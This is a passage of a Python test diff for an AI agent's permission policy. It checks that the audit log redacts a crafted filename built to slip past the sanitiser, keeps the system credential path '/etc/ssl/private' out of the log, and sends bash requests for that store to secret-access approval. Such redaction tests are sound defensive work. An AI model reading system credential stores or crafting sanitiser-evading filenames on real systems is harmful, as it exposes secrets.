+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(
+            marker, raw,
+            "REDACTION: filename with an unmatched close paren must not "
+            "defeat the sanitiser and leak into the raw audit file",
+        )
+        self.assertNotIn(
+            "/etc/ssl/private", raw,
+            "REDACTION: resolved system-credential directory must never "
+            "reach the log",
+        )
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "protected path and secret access approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertIn("system credential store", rec["rule"])
 
     def test_typescript_permission_policy_parses(self) -> None:
         # Node 22.6+ can strip types; the loader in Pi does the same. Without
